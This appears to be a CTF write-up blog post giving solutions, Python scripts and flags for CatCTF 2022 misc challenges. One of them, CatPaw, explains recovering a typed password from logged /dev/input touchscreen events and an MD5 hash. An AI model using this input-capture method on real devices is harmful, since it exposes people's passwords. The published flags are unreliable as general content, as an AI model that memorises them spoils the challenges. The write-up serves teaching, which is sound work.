<h3 id="CatFlag"><a href="#CatFlag" class="headerlink" title="CatFlag"></a>CatFlag</h3><p>只有CatCTF才能出Cat都会拿的flag</p>
<p><code>cat flag</code>，就能通过猫猫拿到flag了</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-03-00-33-09_rHRFbFYYAp.png" class="">

<p>Windows下PowerShell也能通过猫猫拿flag</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-03-00-34-11_rI5qqMDazg.png" class="">

<p>Windows下cmd可以打字出flag <code>type flag</code></p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-03-00-37-22_CAgQXDRFRA.png" class="">

<p><del>什么？你要通过记事本vim010Editor拿flag? 糊你猫脸.png</del></p>
<p>有部分选手先<code>strings flag</code>，请不要这样做</p>
<p>PS1：出题原理</p>
<p><code>ANSI escape code</code></p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ANSI_escape_code" title="https://en.wikipedia.org/wiki/ANSI_escape_code">https://en.wikipedia.org/wiki/ANSI_escape_code</a></p>
<p>控制光标的移动，输出随机字符，输出的量足够多就会有动态效果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">FILE = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeThings</span>(<span class="params">b</span>):</span><br><span class="line">    FILE.write(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MoveLeft</span>(<span class="params">n=<span class="number">1</span></span>):</span><br><span class="line">    writeThings(<span class="string">b&#x27;\x1b[C&#x27;</span>*n)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MoveRight</span>(<span class="params">n=<span class="number">1</span></span>):</span><br><span class="line">    writeThings(<span class="string">b&#x27;\x1b[D&#x27;</span>*n)</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&#x27; CatCTF&#123;!2023_Will_Be_Special,2022_Was_Not!&#125; &#x27;</span></span><br><span class="line"><span class="comment">#flag彩蛋：https://thwiki.cc/%E6%98%8E%E6%97%A5%E4%B9%8B%E7%9B%9B%EF%BC%8C%E6%98%A8%E6%97%A5%E4%B9%8B%E4%BF%97</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">COUNT = <span class="number">2022234</span></span><br><span class="line">randpos=[random.randint(<span class="number">0</span>,<span class="built_in">len</span>(FLAG)-<span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(COUNT)]</span><br><span class="line">randchar = [random.randint(<span class="number">0x20</span>,<span class="number">0x7e</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(COUNT)]</span><br><span class="line"><span class="comment"># adjust char</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(FLAG)):</span><br><span class="line">    pos = COUNT</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(COUNT-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(randpos[j] == i):</span><br><span class="line">            pos = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    randchar[pos] = FLAG[i]</span><br><span class="line">    </span><br><span class="line">writeThings(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">POS = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(COUNT):</span><br><span class="line">    <span class="keyword">if</span>(randpos[i] &gt; POS):</span><br><span class="line">        MoveLeft(randpos[i]-POS)</span><br><span class="line">    <span class="keyword">elif</span>(randpos[i] &lt; POS):</span><br><span class="line">        MoveRight(POS-randpos[i])</span><br><span class="line">    writeThings(<span class="built_in">bytearray</span>([randchar[i]]))</span><br><span class="line">    POS = randpos[i]+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">writeThings(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PS2：彩蛋</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-03-00-45-27_sbSpLUOrWH.png" class="">

<h3 id="CatPaw"><a href="#CatPaw" class="headerlink" title="CatPaw"></a>CatPaw</h3><p>这是作为Misc的压轴题出的，难度较大（Lunatic）</p>
<p>分析文件，观察到是小米手机的备份文件，实际也是ANDROID BACKUP文件，去掉小米的header</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-09-15-41-35_KUIi2qunIN.png" class="">

<p><a target="_blank" rel="noopener" href="https://github.com/nelenkov/android-backup-extractor" title="https://github.com/nelenkov/android-backup-extractor">https://github.com/nelenkov/android-backup-extractor</a> 解压</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-09-15-40-49_35ThyeGMD8.png" class="">

<p>分析apk ，可以看到输入的密码md5 hash是8b9b0ad9c324204fac87ae0fc2c630bd</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-09-15-57-01_YNiepPfq5y.png" class="">

<p>分析lib函数，发现没有实际的调用，有函数 打开并读取文件 “&#x2F;dev&#x2F;input&#x2F;event1” 到自己的目录下</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-09-15-58-47_iaBPkH1zzp.png" class="">

<p>分析 ef&#x2F;1666666666 发现结构是24byte 对齐</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-09-16-07-15_G0DByG2R2Y.png" class="">

<p>提出所有数据，结合event struct结构体，大致猜测</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-22-05-18_d9WvakdFF2.png" class="">

<p>53，54对应X，Y，58且值为1000为按下，提出所有的按键</p>
<p>这里有选手翻到了kernel底层源码解析event结构体</p>
<p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/input/input.txt" title="https://www.kernel.org/doc/Documentation/input/input.txt">https://www.kernel.org/doc/Documentation/input/input.txt</a></p>
<p><a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h" title="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h</a></p>
<p>输入密码时都会弹出安全键盘，因为是小米的备份文件，寻找小米安全键盘布局，能找到一个</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/keyboard_obml2LP1Jv.png" class="">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont </span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">1080</span>, <span class="number">2200</span>), <span class="string">&quot;#00000000&quot;</span>)</span><br><span class="line">image =Image.<span class="built_in">open</span>(<span class="string">&quot;keyboard.png&quot;</span>)</span><br><span class="line">draw = ImageDraw.Draw(image)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawText</span>(<span class="params">x,y,text</span>):</span><br><span class="line">    draw.text((x,y+<span class="number">100</span>),text,(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),text_size = <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cropImage</span>(<span class="params">x,y,<span class="built_in">id</span></span>):</span><br><span class="line">    y=y+<span class="number">100</span></span><br><span class="line">    S = <span class="number">50</span></span><br><span class="line">    xa = x - S</span><br><span class="line">    ya = y - S</span><br><span class="line">    xb = x + S</span><br><span class="line">    yb = y + S</span><br><span class="line">    <span class="keyword">if</span>(xa &lt; <span class="number">0</span>):</span><br><span class="line">        xb -= xa</span><br><span class="line">        xa = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span>(xb &gt; <span class="number">1080</span>):</span><br><span class="line">        xa -= (xb-<span class="number">1080</span>)</span><br><span class="line">        xb = <span class="number">1080</span></span><br><span class="line">    <span class="keyword">if</span>(ya &lt; <span class="number">0</span>):</span><br><span class="line">        yb -= ya</span><br><span class="line">        ya = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span>(yb &gt; <span class="number">2200</span>):</span><br><span class="line">        ya -= (yb - <span class="number">2200</span>)</span><br><span class="line">        yb = <span class="number">2200</span></span><br><span class="line">    crop = image.crop((xa,ya,xb,yb))</span><br><span class="line">    crop.save(<span class="string">&quot;./keys/%d.png&quot;</span>%<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1666666666&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">X = <span class="number">0</span></span><br><span class="line">Y = <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(offset &lt; <span class="built_in">len</span>(data)):</span><br><span class="line">    result = struct.unpack_from(<span class="string">&quot;&lt;QQHHi&quot;</span>,data,offset)</span><br><span class="line">    offset += struct.calcsize(<span class="string">&quot;&lt;QQHHi&quot;</span>)</span><br><span class="line">    <span class="comment"># 53 X 54 Y</span></span><br><span class="line">    <span class="keyword">if</span>(result[<span class="number">3</span>] == <span class="number">58</span> <span class="keyword">and</span> result[<span class="number">4</span>] == <span class="number">1000</span>):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="comment">#drawText(X,Y,str(count))</span></span><br><span class="line">        cropImage(X,Y,count)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">if</span>(result[<span class="number">3</span>] == <span class="number">53</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;X&#x27;</span>,result[<span class="number">4</span>],end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        X = result[<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span>(result[<span class="number">3</span>] == <span class="number">54</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Y&#x27;</span>,result[<span class="number">4</span>],end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        Y = result[<span class="number">4</span>]</span><br><span class="line">        </span><br><span class="line">image.save(<span class="string">&quot;./test.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-15-00-56-08_YYxnivMVZg.png" class="">

<p>发现会输入符号，大小写，安全键盘的符号布局怎么搞?</p>
<p>大小写可以观察CatCTF的输入，输入字母时Shift不会灭，有2位选手最后卡在了这里，</p>
<p><code>CatCTF&#123;the_C4t_!5_REc0rdiN9_$cr34n_by_inPUt_evEN7&#125;</code></p>
<p>没有分析清楚大小写规律，遗憾</p>
<h4 id="1-拥有小米手机，可以查看对应的符号布局"><a href="#1-拥有小米手机，可以查看对应的符号布局" class="headerlink" title="1. 拥有小米手机，可以查看对应的符号布局"></a>1. 拥有小米手机，可以查看对应的符号布局</h4><p>恰好有小米手机确实可以偷鸡</p>
<h4 id="2-寻找小米安全键盘的符号布局"><a href="#2-寻找小米安全键盘的符号布局" class="headerlink" title="2.寻找小米安全键盘的符号布局"></a>2.寻找小米安全键盘的符号布局</h4><p>没有小米手机好像很难的样子，出题人没找到</p>
<h4 id="3-合理猜测"><a href="#3-合理猜测" class="headerlink" title="3.合理猜测"></a>3.合理猜测</h4><p>符号p 出现次数很多，猜测 _</p>
<p><code>CatCTF&#123;the_C4t_ 5_Rec0rdiN9_ cr33n_by_inPut_evEn7&#125;</code></p>
<p>发现只差2个，爆破md5就能出了 或者根据语义推测出 ! $</p>
<p><code>CatCTF&#123;the_C4t_!5_Rec0rdiN9_$cr33n_by_inPut_evEn7&#125;</code></p>
<h4 id="4-重放"><a href="#4-重放" class="headerlink" title="4.重放?"></a>4.重放?</h4><p>未曾设想的道路，写入到 &#x2F;dev&#x2F;input&#x2F;event1 应该可行?</p>
<p>要求小米且同型号同屏幕大小手机，很难的辣，不过确实有选手尝试了，并且打出了CatC</p>
<p>然后提示invalid argument</p>
<p>猜测是一次数据太多，建议尝试下分段写入</p>
<p>（然后这名选手事后通过读取数据adb shell input重放了，也是厉害）</p>
<p>也有选手尝试在模拟器上重放，出现了错误，具体原因未验证</p>
<h3 id="CatJump"><a href="#CatJump" class="headerlink" title="CatJump"></a>CatJump</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><p>出题5天，被秒半小时，当时做环境的时候数据忘了清干净，导致被非预期了，原本挺有趣的题目没多少人玩到。 感兴趣的师傅后续也可以试试原有的解题思路，希望可以给各位有些帮助。</p>
<h4 id="出题灵感来源"><a href="#出题灵感来源" class="headerlink" title="出题灵感来源"></a>出题灵感来源</h4><ol>
<li>一直在玩黑苹果，虽然11代intel已经是黑果的绝唱了，但中间的一些思路倒是很有意思的。</li>
<li>安装黑果的重点就在于硬件能否被苹果系统识别，因此就有了本题，大致就是通过检测系统的硬件配置，实现一个简单的macOS检测机制。</li>
<li>选手需要通过oc或者其他方式修改nvram中的内容，让程序识别到该系统的某些配置。</li>
</ol>
<h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><p>当时预设了2种解题方式</p>
<h4 id="解题思路1"><a href="#解题思路1" class="headerlink" title="解题思路1"></a>解题思路1</h4><ol>
<li>拿vmdk文件，提取其中的可执行文件进行分析，最终锁定openssl解密的部分，利用题目描述中的「cat_jump」进行解密获得flag。</li>
</ol>
<h4 id="解题思路2"><a href="#解题思路2" class="headerlink" title="解题思路2"></a>解题思路2</h4><p>拿到vmdk，进行仿真挂载，但发现该磁盘无法在ubuntu等预设中进行挂载，因为这里用的是Alpine Linux，并且是Alpine是UEFI，Vmware中一般都是bios引导启动，如果是vmware workstation的话需要在创建完毕后，高级中设置为UEFI启动，即可进入游戏。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727257912564_M53gte1GHd.jpg" class="">

<p>进入游戏后，这里有个小脑洞，一般的游戏都会有「退出」模块，一般为「q」，但这里用的是「]」，退出后即可发现读取文件失败了。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727258094705_G4mqRjXCyX.jpg" class="">

<p>读取的是nvram中的一个特定变量，如无法检测到这个变量的话，即使进了系统登录界面也无济于事。</p>
<p>通过opencore做一个引导驱动，在nvram中写入报错中的特定变量名和变量值，将该引导挂载到虚拟机中，我这直接用的U盘创了个ESP分区，把EFI丢进去了。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727259978933_9DGf9SkdmT.jpg" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/16727273192363_Hp2xaNCv6E.jpg" class="">

<p>如果U盘是USB3.1的记得改下兼容性</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727273895670_7O4huPDria.jpg" class="">

<p>启动到固件后，选择opencore启动，这样EFI引导就是走的opencore，模拟出的nvram也就能获取到。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727274136847_ziBLJihTah.jpg" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/16727274275381_0KMCb0M7e3.jpg" class="">

<p>最终进入启动界面即可获取flag。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727274418685_OZSTGT6olj.jpg" class="">

<h4 id="解题思路3（非预期）"><a href="#解题思路3（非预期）" class="headerlink" title="解题思路3（非预期）"></a>解题思路3（非预期）</h4><ol>
<li>strings cat_jump_clean.vmdk | grep CatCTF{</li>
<li>010编辑搜索</li>
<li>取证大师提取原始数据</li>
<li>记事本打开</li>
<li>…..</li>
</ol>
<p>总之就是磁盘数据没清干净，被一把梭了。</p>
<h3 id="CatCat"><a href="#CatCat" class="headerlink" title="CatCat"></a>CatCat</h3><p>rabbit解密，密钥在图片中使用strings搜索password即可找到</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/1672763715868_Ixujs6YJde.png" class="">

<p>将解密结果采用base91解密，采用在线网站(<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/brainfuck" title="https://ctf.bugku.com/tool/brainfuck">https://ctf.bugku.com/tool/brainfuck</a>)转换Ook，最后解密即可</p>
<p>CatCTF{Th1s_V3ry_cute_catcat!!!}</p>
<h3 id="CatchCat"><a href="#CatchCat" class="headerlink" title="CatchCat"></a>CatchCat</h3><p>题目附件给出的是GPS的NMEA格式轨迹数据</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_vCasnHhDRI.png" class="">

<p>最简单的方法就是NMEA转KML可视化还原GPS轨迹</p>
<p><a target="_blank" rel="noopener" href="https://www.h-schmidt.net/NMEA/" title="https://www.h-schmidt.net/NMEA/">https://www.h-schmidt.net/NMEA/</a></p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_iXZu0a3L1-.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/image_XEtj08zH_I.png" class="">

<p>NMEA转KML之后再可视化就可以了</p>
<p><a target="_blank" rel="noopener" href="https://mygeodata.cloud/converter/" title="https://mygeodata.cloud/converter/">https://mygeodata.cloud/converter/</a></p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_uyL446C1JK.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/image_JT4arjVZpH.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/image_nJqvtBCn_5.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/image_e3sSc1hTkc.png" class="">

<p>为了方便大家识别，这里大大缩短了flag的内容。</p>
<p>CatCTF{GPS_M1ao}</p>
<p>另外一种方法就是写脚本提取数据还原GPS轨迹，大家根据自己的喜好来解决就好啦。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;CatchCat.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line"></span><br><span class="line">x = []</span><br><span class="line"></span><br><span class="line">y = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> line.strip():</span><br><span class="line"></span><br><span class="line">  d1, d2 = <span class="built_in">float</span>(line[<span class="number">17</span>:<span class="number">30</span>]), <span class="built_in">float</span>(line[<span class="number">33</span>:<span class="number">47</span>])</span><br><span class="line"></span><br><span class="line">  x.append(d1)</span><br><span class="line"></span><br><span class="line">  y.append(d2)</span><br><span class="line"></span><br><span class="line">plt.scatter(x,y)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/image_MpKNvK4Z-P.png" class="">

<p>CatCTF{GPS_M1ao}</p>
<h3 id="Nepnep-祝你新年快乐啦！-xD"><a href="#Nepnep-祝你新年快乐啦！-xD" class="headerlink" title="Nepnep 祝你新年快乐啦！&#xD;"></a>Nepnep 祝你新年快乐啦！&#xD;</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1VM411y7am/?spm_id_from=333.999.0.0&vd_source=fa625999cb95a3474b87f02e1e0f148f" title="新年快乐！_哔哩哔哩_bilibili">新年快乐！_哔哩哔哩_bilibili</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1VM411y7am/?spm_id_from=333.999.0.0&vd_source=fa625999cb95a3474b87f02e1e0f148f" title="https://www.bilibili.com/video/BV1VM411y7am/?spm_id_from=333.999.0.0&amp;vd_source=fa625999cb95a3474b87f02e1e0f148f">https://www.bilibili.com/video/BV1VM411y7am/?spm_id_from&#x3D;333.999.0.0&amp;vd_source&#x3D;fa625999cb95a3474b87f02e1e0f148f</a></p>
<p>视频评论区置顶，视频最后一帧也有</p>
<p>H4ppy_n3w_y34r</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xia0ji233.github.io">xia0ji233</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/">https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xia0ji233.github.io" target="_blank">xia0ji233's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/04/Go13/" title="Golang入门学习（13）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Golang入门学习（13）</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/01/target/" title="学习目标"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">学习目标</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><a href="/"> <div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div></a><div class="author-info__name">xia0ji233</div><div class="author-info__description">Nepnep team</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">283</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">107</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xia0ji233"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xia0ji233" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xia0ji233@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">老当益壮，宁移白首之心？穷且益坚，不坠青云之志。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">目录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%84%9F%E8%B0%A2"><span class="toc-number">1.1.</span> <span class="toc-text">感谢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%9B%E6%96%B0"><span class="toc-number">1.2.</span> <span class="toc-text">招新</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bitcoin%F0%9F%AA%99"><span class="toc-number">2.1.</span> <span class="toc-text">bitcoin🪙</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">2.1.1.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">2.1.2.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">2.1.3.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HRPVM%F0%9F%96%A5%EF%B8%8F"><span class="toc-number">2.2.</span> <span class="toc-text">HRPVM🖥️</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.1.</span> <span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toc-number">2.2.3.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#injection2-0%F0%9F%92%89"><span class="toc-number">2.3.</span> <span class="toc-text">injection2.0💉</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">2.3.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC"><span class="toc-number">2.3.2.</span> <span class="toc-text">上传脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kernel-test-%E6%9C%AC%E6%AC%A1%E8%B5%84%E6%BA%90%E5%90%88%E9%9B%86%EF%BC%8C%E5%8C%85%E6%8B%AC%E6%BA%90%E7%A0%81%EF%BC%8CEXP%EF%BC%8Cdocker%F0%9F%A7%AC"><span class="toc-number">2.4.</span> <span class="toc-text">kernel-test 本次资源合集，包括源码，EXP，docker🧬</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ret2usr"><span class="toc-number">2.4.1.</span> <span class="toc-text">Ret2usr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E6%98%93%E8%AE%B2%E8%A7%A3"><span class="toc-number">2.4.2.</span> <span class="toc-text">简易讲解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-2"><span class="toc-number">2.4.3.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E7%82%B9"><span class="toc-number">2.4.4.</span> <span class="toc-text">重点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">2.4.5.</span> <span class="toc-text">攻击思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 